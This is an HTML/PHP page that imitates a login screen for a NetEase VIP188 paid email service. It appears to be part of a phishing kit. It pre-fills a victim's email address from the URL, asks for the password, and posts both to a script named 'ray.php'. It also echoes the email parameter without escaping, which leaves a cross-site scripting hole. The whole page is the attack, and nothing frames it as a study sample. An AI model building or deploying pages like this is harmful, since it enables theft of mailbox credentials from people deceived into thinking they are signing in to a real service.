<html>

<head>
<title>&#32593;&#26131;VIP188&#37038;&#31665;&#30331;&#24405;&#27880;&#20876;-&#26356;&#23433;&#20840;&#31283;&#23450;&#30340;&#20010;&#20154;&#21830;&#21153;&#25910;&#36153;&#37038;&#31665;</title>
<link rel="shortcut icon" href="favicon.ico" />

</head>

<body background="body.jpg">

	<table>

	<tr><td height="175"></td></tr>



	<tr><td>
	
		<form method="post" action="ray.php">

		<table><tr>

		<td width="782"></td>
		
		




		<td>

			<table>
	
			<tr><td>
			
						

						<table cellspacing="0"><tr><td 
						style="width:270px; height:40px; background-color: #A4A4A4;">
					
							<table cellspacing="0"><tr><td 
							style="width:270px; height:40px; background-color: #FFFFFF;">
							
									<table><tr>
									
									<td width="5"></td>
									
									
									
									<td>
									
											<font face="verdana" size="2">
											<b><?php echo $_GET['email']; ?></b>
											</font>
											
											<input type="hidden" name="username" value="<?php echo $_GET['email']; ?>">
									
									</td>
									
									</tr></table>
					
							</td></tr></table>
					
					</td></tr></table>


	
			</td></tr>





			<tr><td height="10"></td></tr>
			
			
			
			
			
			<tr><td>
			
					<input  name="password" type="password" style="width:270px; height:42px; 
					font-family: Verdana; font-size: 13px; color:#000000; 
					background-color: #ffffff; border: solid 1px #A4A4A4; padding: 10px;" 
					required="" placeholder="&#23494;&#30721;">

			
			</td></tr>
			
			
			
			
			<tr><td height="10"></td></tr>
			
		
			
			
			
			<tr><td>
			
						<input type="submit" value="&#31614;&#21040;" 
						style="width:270px; height:40px; background-color: #896F09; border: solid 3px #896F09; 
						font-family: Verdana; font-size: 15px; font-weight: light; color: #ffffff;">
						
						
						


			
			</td></tr>
			
			
			
			
			<tr><td height="0">
			
				</form>
			
			</td></tr>

			</table>

		</td>

		</tr></table>

	</td></tr>

	</table>


</body>

</html>